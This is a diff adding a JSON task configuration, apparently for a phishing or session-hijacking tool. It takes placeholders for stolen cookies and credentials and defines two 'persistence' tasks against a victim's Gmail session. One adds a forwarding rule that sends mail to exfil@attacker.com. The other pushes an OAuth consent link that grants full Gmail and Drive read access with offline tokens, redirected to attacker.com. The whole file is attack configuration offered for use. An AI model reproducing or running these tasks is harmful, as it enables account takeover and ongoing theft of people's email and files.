@@ -1,0 +1,26 @@
+{
+  "tracker":     "%%%TRACKER%%%",
+  "cookies":     %%%COOKIES%%%,
+  "credentials": %%%CREDENTIALS%%%,
+
+  "tasks": [
+    {
+      "label": "gmail-forwarding-rule",
+      "type":  "persistence",
+      "name":  "GmailForwardingRule",
+      "params": {
+        "fixSession": "https://mail.google.com/mail/u/0/",
+        "forwardTo":  "exfil@attacker.com"
+      }
+    },
+    {
+      "label": "google-oauth-app",
+      "type":  "persistence",
+      "name":  "GoogleOAuthApp",
+      "params": {
+        "fixSession": "https://mail.google.com/mail/u/0/",
+        "consentUrl": "https://accounts.google.com/o/oauth2/v2/auth?client_id=YOUR_CLIENT_ID&redirect_uri=https%3A%2F%2Fattacker.com%2Fcallback&response_type=code&scope=https%3A%2F%2Fmail.google.com%2F+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive.readonly&access_type=offline&prompt=consent"
+      }
+    }
+  ]
+}
